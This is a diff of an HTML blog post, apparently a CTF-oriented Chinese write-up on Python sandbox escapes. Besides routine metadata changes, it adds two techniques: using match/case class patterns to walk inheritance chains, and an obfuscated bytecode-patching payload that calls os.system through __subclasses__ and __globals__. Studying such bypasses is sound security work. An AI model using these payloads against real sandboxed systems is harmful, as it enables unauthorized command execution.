@@ -30,12 +30,13 @@
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102803052.png">
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102848722.png">
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250603194452776.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250923192727274.png">
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250704170021243.png">
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703093113593.png">
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094342023.png">
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094649462.png">
 <meta property="article:published_time" content="2025-05-05T08:13:51.000Z">
-<meta property="article:modified_time" content="2025-08-05T09:49:14.025Z">
+<meta property="article:modified_time" content="2025-10-06T12:33:55.460Z">
 <meta property="article:author" content="AyaN0">
 <meta property="article:tag" content="-Web">
 <meta name="twitter:card" content="summary">
@@ -183,7 +184,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -263,7 +264,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-08-05 17:49:14" itemprop="dateModified" datetime="2025-08-05T17:49:14+08:00">2025-08-05</time>
+      <time title="修改时间：2025-10-06 20:33:55" itemprop="dateModified" datetime="2025-10-06T20:33:55+08:00">2025-10-06</time>
     </span>
 
   
@@ -280,14 +281,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>39k</span>
+      <span>41k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1:11</span>
+      <span>1:14</span>
     </span>
 </div>
 
@@ -1007,6 +1008,28 @@ print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))</code></pre>
                 match bass:
                     case object(__subclasses__=subclazz):
                         print(subclazz)</code></pre>
+<p>**那么机理是什么呢?**我们看看官方文档</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250923192727274.png" alt="image-20250923192727274"></p>
+<p>我们敏感的发现里面有一个类模式</p>
+<pre><code class="highlight python"><span class="keyword">class</span> <span class="title class_">Point</span>:
+    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):
+        <span class="variable language_">self</span>.x = x
+        <span class="variable language_">self</span>.y = y
+
+<span class="keyword">def</span> <span class="title function_">where_is</span>(<span class="params">point</span>):
+    <span class="keyword">match</span> point:
+        <span class="keyword">case</span> Point(x=<span class="number">0</span>, y=<span class="number">0</span>):
+            <span class="built_in">print</span>(<span class="string">&quot;Origin&quot;</span>)
+        <span class="keyword">case</span> Point(x=<span class="number">0</span>, y=y):
+            <span class="built_in">print</span>(<span class="string">f&quot;Y=<span class="subst">&#123;y&#125;</span>&quot;</span>)
+        <span class="keyword">case</span> Point(x=x, y=<span class="number">0</span>):
+            <span class="built_in">print</span>(<span class="string">f&quot;X=<span class="subst">&#123;x&#125;</span>&quot;</span>)
+        <span class="keyword">case</span> Point():
+            <span class="built_in">print</span>(<span class="string">&quot;Somewhere else&quot;</span>)
+        <span class="keyword">case</span> _:
+            <span class="built_in">print</span>(<span class="string">&quot;Not a point&quot;</span>)</code></pre>
+<p>官方的例子，其实x,y都是Point的实例，我们发现这个使用的前提是Point这个类要是可以不断创建新的对象的</p>
+<p>那么就可以利用嵌套来不断访问属性打继承链</p>
 <h4 id="绕过-astassign-赋值变量"><a class="markdownIt-Anchor" href="#绕过-astassign-赋值变量"></a> 绕过 ast.Assign 赋值变量</h4>
 <p>ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
 <pre><code class="highlight plaintext">[
@@ -1232,6 +1255,25 @@ print(&quot;code: &quot;, code.co_code.hex())
 
 # 64006d006d01a002a100640119006d036d046402190064038301010064045300</code></pre>
 <p>LOAD_ATTR 对应操作码 6a，IMPORT_FROM 对应字节码为 6d，当我将 6a 直接替换为 6d 时，居然能够正常执行！</p>
+<p>也可以用函数来替代</p>
+<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">f</span>():
+    <span class="keyword">return</span> ().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">142</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cmd&#x27;</span>)
+
+
+<span class="built_in">print</span>(<span class="string">f&quot;code:<span class="subst">&#123;f.__code__.co_code&#125;</span>&quot;</span>)
+<span class="built_in">print</span>(<span class="string">f&quot;nlocals:<span class="subst">&#123;f.__code__.co_nlocals&#125;</span>&quot;</span>)
+<span class="built_in">print</span>(<span class="string">f&quot;varnames:<span class="subst">&#123;f.__code__.co_varnames&#125;</span>&quot;</span>)
+<span class="built_in">print</span>(<span class="string">f&quot;names:<span class="subst">&#123;f.__code__.co_names&#125;</span>&quot;</span>)
+<span class="built_in">print</span>(<span class="string">f&quot;consts:<span class="subst">&#123;f.__code__.co_consts&#125;</span>&quot;</span>)</code></pre>
+<p>这样也能拿到字节码</p>
+<p>等效的去替代</p>
+<pre><code class="highlight plaintext">f.__dict__.update((
+        (&#x27;c\x6f_c\x6fn\x73t\x73&#x27;,(0, &#x27;&#x27;, 1, 142, &#x27;\x73y\x73tem&#x27;, &#x27;cmd&#x27;)),
+        (&#x27;c\x6f_name\x73&#x27;, (&#x27;__cla\x73\x73__&#x27;, &#x27;__mr\x6f__&#x27;, &#x27;__\x73\x75bcla\x73\x73e\x73__&#x27;, &#x27;__init__&#x27;, &#x27;__gl\x6fbal\x73__&#x27;)),
+        (&#x27;c\x6f_c\x6fde&#x27;,b&#x27;\x97\x00\x02\x00d\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00d\x04\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00&#x27;)
+    )),
+    f.__setattr__(&#x27;__c\x6fde__&#x27;, f.__code__.replace(**f.__dict__)),
+    f()</code></pre>
 <h3 id="无回显"><a class="markdownIt-Anchor" href="#无回显"></a> 无回显</h3>
 <p>在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。</p>
 <p>以<code> AmateursCTF</code> 2023 的一道题目为例，题目的源码如下：</p>
@@ -1570,7 +1612,7 @@ $</code></pre>
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2025</span>
+    <span itemprop="copyrightYear">2026</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -1581,13 +1623,13 @@ $</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">363k</span>
+    <span title="站点总字数">380k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:59</span>
+    <span title="站点阅读时长">11:30</span>
   </span>
 </div>
 <div class="busuanzi-count">
